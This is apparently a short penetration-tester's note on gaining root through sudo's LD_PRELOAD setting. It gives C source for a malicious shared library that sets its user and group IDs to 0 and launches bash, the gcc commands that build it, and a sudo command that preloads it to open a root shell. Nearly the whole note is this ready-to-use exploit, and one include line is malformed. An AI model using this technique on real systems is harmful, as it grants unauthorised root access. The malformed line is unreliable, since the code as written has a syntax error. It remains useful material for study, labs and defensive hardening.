-- -
In essence, this vector will allow the user to preload libraries when running sudo, so while running something we are allowed to sudo with, we can feed it a malicious library file that will grant us a shell. 
### Enum
![[Sudo#^767678|Sudo]]
![[Sudo#^866a8f|Sudo]]
#### Write malicious library
Example below saved as: `shell.c`
This should be loaded before the software we are running, and it will run with root permissions. It will set it's UID and GID ID to 0 (root) and then execute bash, giving you a shell:
```c
#include <stdio.h
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");	
}
```
#### Compile code
```bash
# in this example, the above code was saved as shell.c
gcc -fPIC -shared -o <output file>.so <c code>.c -nostartfiles
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
#### Exploit
```bash
# again, our library file in this example is written to shell.so
# note you need to run something that is allowed from sudo -l, what software you choose is irrelevant as the library will be loaded first and it should open a shell.
sudo LD_PRELOAD=<absolute path>.so <sudo software>
sudo LD_PRELOAD=/home/user/shell.so apache2
```